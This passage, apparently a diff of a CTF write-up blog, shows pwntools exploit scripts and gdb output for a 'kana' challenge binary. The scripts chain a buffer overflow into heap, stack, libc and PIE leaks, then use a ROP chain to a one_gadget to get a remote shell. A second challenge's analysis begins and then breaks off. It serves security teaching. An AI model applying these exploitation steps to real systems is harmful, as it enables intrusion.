+<p>The answer is yes. There&rsquo;s exist a good target in the stack below the saved RIP that we can use to leak a value. When I was debugging with gdb, I notice that if we use the <code>fourth</code> menu to generate a new kana (which is a string that will be always printed during printing the menu), what it does is actually:</p>
+<ul>
+<li>Allocating the string to a heap chunk</li>
+<li>Put the heap chunk address at the stack</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele 30
+</span></span><span class="line"><span class="cl">00:0000│ rsp   0x7fffffffdad0 ◂— 0x21 /* &#39;!&#39; */
+</span></span><span class="line"><span class="cl">01:0008│       0x7fffffffdad8 —▸ 0x7fffffffdbc0 —▸ 0x7ffff7d44ce0 (main_arena+96) —▸ 0x5555555785b0 ◂— 0x0
+</span></span><span class="line"><span class="cl">02:0010│ rcx-2 0x7fffffffdae0 ◂— 0x3031 /* &#39;10&#39; */
+</span></span><span class="line"><span class="cl">03:0018│       0x7fffffffdae8 ◂— 0x0
+</span></span><span class="line"><span class="cl">04:0020│       0x7fffffffdaf0 ◂— 0x0
+</span></span><span class="line"><span class="cl">05:0028│       0x7fffffffdaf8 ◂— 0x0
+</span></span><span class="line"><span class="cl">06:0030│       0x7fffffffdb00 ◂— 0x0
+</span></span><span class="line"><span class="cl">07:0038│       0x7fffffffdb08 ◂— 0x0
+</span></span><span class="line"><span class="cl">08:0040│       0x7fffffffdb10 —▸ 0x555555578590 ◂— 0x555555578
+</span></span><span class="line"><span class="cl">09:0048│       0x7fffffffdb18 ◂— 0x20 /* &#39; &#39; */
+</span></span><span class="line"><span class="cl">0a:0050│       0x7fffffffdb20 ◂— 0x20 /* &#39; &#39; */
+</span></span><span class="line"><span class="cl">0b:0058│       0x7fffffffdb28 —▸ 0x55555555ae99 ◂— jmp 0x55555555aeb9
+</span></span><span class="line"><span class="cl">0c:0060│       0x7fffffffdb30 —▸ 0x7fffffffdb70 ◂— 0x0
+</span></span><span class="line"><span class="cl">0d:0068│       0x7fffffffdb38 ◂— 0x2ffffdbc0
+</span></span><span class="line"><span class="cl">0e:0070│       0x7fffffffdb40 —▸ 0x55555555fc20 —▸ 0x5555555566c0 ◂— endbr64 
+</span></span><span class="line"><span class="cl">0f:0078│       0x7fffffffdb48 ◂— 0x4
+</span></span><span class="line"><span class="cl">10:0080│ rbp   0x7fffffffdb50 —▸ 0x7fffffffdc20 ◂— 0x1
+</span></span><span class="line"><span class="cl">11:0088│       0x7fffffffdb58 —▸ 0x55555555ac74 ◂— mov ebx, eax
+</span></span><span class="line"><span class="cl">12:0090│       ...
+</span></span><span class="line"><span class="cl">19:00c8│       0x7fffffffdb98 ◂— 0x57 /* &#39;W&#39; */
+</span></span><span class="line"><span class="cl">1a:00d0│       0x7fffffffdba0 —▸ 0x555555576d50 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#39;
+</span></span><span class="line"><span class="cl">1b:00d8│       0x7fffffffdba8 ◂— 0x20 /* &#39; &#39; */
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At this point, I realized that with this, we can actually get a leak by overwriting that stack which contains our <code>kana</code> address with our target address. With the buffer overflow bug. we can actually try to get a leak of the <code>heap</code> address first.</p>
+<h4 id="leaking-heap-address">Leaking heap address</h4>
+<p>With the BOF bug, we can overwrite the last byte of the <code>kana</code> address to null. As you can see in the below examination via GDB, if we overwrite the last byte of <code>kana</code> to null, we will be able to get a leak of the heap address.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/10gx 0x555555576d00
+</span></span><span class="line"><span class="cl">0x555555576d00:	0x0000555000000001	0x0000555555576bc0
+</span></span><span class="line"><span class="cl">0x555555576d10:	0x0000555555577a20	0x0000555555576c10
+</span></span><span class="line"><span class="cl">0x555555576d20:	0x0000000000e38391	0x0000555555576d38
+</span></span><span class="line"><span class="cl">0x555555576d30:	0x0000000000000002	0x0000000000006170
+</span></span><span class="line"><span class="cl">0x555555576d40:	0x0000000000000000	0x0000000000000051
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Below is the partial script to get a leak of heap address</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./kana_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.35.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-2.35.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;144.126.196.198&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">31803</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak heap</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The a*&#39;0x5c&#39; and &#39;\xaf&#39; is a crafted payload that we can use</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># to skip the option read by 0xaf bytes, so that we can leap over</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the saved RIP during triggering the buffer overflow bug.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Basically, withh the BOG, we overwrite the v12 value to 0xaf, so that the next</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write after overwriting the v12 will skip some addressed and jump directly to aaddress</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># below the saved RIP address.</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x5c</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xaf</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked_heap = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">good_heap_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x23e8</span> <span class="c1"># Contains stack address</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_heap</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="n">good_heap_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;target_heap = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_heap</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="leaking-stack-address">Leaking stack address</h4>
+<p>Observing via GDB, I notice that in the address of <code>leaked_heap - 0x23e8</code>, there exist a stack address.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/10gx 0x555555575368
+</span></span><span class="line"><span class="cl">0x555555575368:	0x00007fffffffdb78	0x00005555555750e0
+</span></span><span class="line"><span class="cl">0x555555575378:	0x0000555555575ea0	0x0000000000e382b0
+</span></span><span class="line"><span class="cl">0x555555575388:	0x0000555555575398	0x0000000000000002
+</span></span><span class="line"><span class="cl">0x555555575398:	0x0000000000007567	0x0000000000000000
+</span></span><span class="line"><span class="cl">0x5555555753a8:	0x0000000000000051	0x0000000000000001
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By overwriting the stack address that contains <code>kana</code> to this heap chunk address, we will get a leak of stack. Below is the partial script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x5c</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xaf</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_heap</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked_stack = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_stack</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">good_stack_offset</span> <span class="o">=</span> <span class="mh">0xb0</span> <span class="c1"># Contains libc address</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_stack</span> <span class="o">=</span> <span class="n">leaked_stack</span><span class="o">+</span><span class="n">good_stack_offset</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="leaking-libc-address-and-pie-address">Leaking libc address and pie address</h4>
+<p>After leaking the stack address, it&rsquo;s now very easy for us to get libc and pie address, because there are so many address that contains all of it. Observing via gdb, I notice that the address of <code>leaked_stack+0xb0</code> contains libc address, and <code>leaked_stack-0x20</code> contains a pie address. Just redo the previous step, whhere we overwrite the stack address with hboth of the good addresses, and we will get a libc and pie leak.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x5c</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xaf</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_stack</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="mh">0x29d90</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked_libc = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc_base = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak PIE</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_stack</span> <span class="o">=</span> <span class="n">leaked_stack</span><span class="o">-</span><span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x5c</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xaf</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_stack</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_pie</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pie_base</span> <span class="o">=</span> <span class="n">leaked_pie</span> <span class="o">-</span> <span class="mh">0x6c68</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pie_base = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="gain-remote-code-execution">Gain Remote Code Execution</h4>
+<p>Now that we&rsquo;ve got a leak of libc, pie, and stack address, the exploitation is become a classic ROP. I decided to do ROP to <code>one_gadget</code>. Below is the partial script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ROP to one_gadget</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Try to ROP...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_rbp</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span><span class="mh">0x000000000000605f</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x0000000000006022</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebcf8</span> <span class="c1"># rbp-0x48 writable, rbp-0x50 null, r12 null</span>
+</span></span><span class="line"><span class="cl"><span class="n">rbp</span> <span class="o">=</span> <span class="n">leaked_stack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x6b</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see in the above script, I tried to do a ROP by first fulfilling the <code>one_gadget</code> constraint with gadgets that I found in the given binary. After that, we just need to return to the <code>one_gadget</code>, and we will get a shell.</p>
+<h4 id="full-script-3">Full script</h4>
 <p>Below is my full script:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1198,8 +1799,792 @@
         </div>
     </div>
 <h3 id="initial-analysis-4">Initial Analysis</h3>
-<p>Under Construction</p>
+<p>Let&rsquo;s start by <code>checksec</code> the binary.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s try to disassemble the binary</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [rsp+14h] [rbp-Ch] BYREF
